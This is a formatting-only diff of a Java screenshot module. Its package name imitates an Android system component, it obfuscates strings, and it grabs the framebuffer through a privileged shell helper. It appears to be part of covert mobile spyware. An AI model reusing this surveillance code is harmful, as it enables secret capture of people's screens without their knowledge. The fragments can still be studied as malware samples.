@@ -9,12 +9,6 @@
 
 package com.android.syssetup.module;
 
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.IOException;
-import java.nio.ByteBuffer;
-import java.util.concurrent.Semaphore;
-
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -24,6 +18,7 @@ import android.view.Display;
 import android.view.Surface;
 import android.view.WindowManager;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.ConfModule;
@@ -38,7 +33,12 @@ import com.android.syssetup.util.DataBuffer;
 import com.android.syssetup.util.Execute;
 import com.android.syssetup.util.ExecuteResult;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
+import java.nio.ByteBuffer;
+import java.util.concurrent.Semaphore;
 
 /**
  * The Class SnapshotAgent.
@@ -49,26 +49,27 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 	private static final int MIN_TIMER = 1 * 1000;
 	private static final long SNAPSHOT_DELAY = 1000;
-
+	/**
+	 * The Constant CAPTURE_FULLSCREEN.
+	 */
+	final private static int CAPTURE_FULLSCREEN = 0;
+	/**
+	 * The Constant CAPTURE_FOREGROUND.
+	 */
+	final private static int CAPTURE_FOREGROUND = 1;
 	final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
 			.getDefaultDisplay();
-
-	/** The Constant CAPTURE_FULLSCREEN. */
-	final private static int CAPTURE_FULLSCREEN = 0;
-
-	/** The Constant CAPTURE_FOREGROUND. */
-	final private static int CAPTURE_FOREGROUND = 1;
-
 	String cameraSound = M.e("/system/media/audio/ui/camera_click.ogg");
-
-	/** The delay. */
+	Semaphore working = new Semaphore(1, true);
+	/**
+	 * The delay.
+	 */
 	private int delay;
-
-	/** The type. */
+	/**
+	 * The type.
+	 */
 	private int type;
 	private int quality;
-	Semaphore working = new Semaphore(1, true);
-
 	private boolean frameBuffer = true;
 	private boolean screenCap = true;
 
@@ -135,7 +136,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			return;
 		}
 
-		synchronized(Status.self().lockFramebuffer) {
+		synchronized (Status.self().lockFramebuffer) {
 			try {
 				if (!screencapMethod()) {
 					screenCap = false;
@@ -202,7 +203,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 					return true;
 				}
 
-			}finally{
+			} finally {
 				aframe.delete();
 				//enableClick();
 			}
@@ -297,18 +298,18 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 					for (int i = 0; i < newraw.length; i++) {
 						switch (i % 4) {
-						case 0:
-							newraw[i] = raw[i + 2]; // A 3:+2
-							break;
-						case 1:
-							newraw[i] = raw[i]; // R 1:+2 2:+1
-							break;
-						case 2:
-							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
-							break;
-						case 3:
-							newraw[i] = raw[i]; // B 1:-2
-							break;
+							case 0:
+								newraw[i] = raw[i + 2]; // A 3:+2
+								break;
+							case 1:
+								newraw[i] = raw[i]; // R 1:+2 2:+1
+								break;
+							case 2:
+								newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+								break;
+							case 3:
+								newraw[i] = raw[i]; // B 1:-2
+								break;
 						}
 						/*
 						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
@@ -327,7 +328,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 				if (buffer == null) {
 					return false;
 				}
-				
+
 				bitmap.copyPixelsFromBuffer(buffer);
 				buffer = null;
 				raw = null;
@@ -471,7 +472,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			}
 
 			Execute.execute(Configuration.shellFile + M.e(" fb /data/data/")
-					+ Status.self().getAppContext().getPackageName() +  M.e("/files/frame"));
+					+ Status.self().getAppContext().getPackageName() + M.e("/files/frame"));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
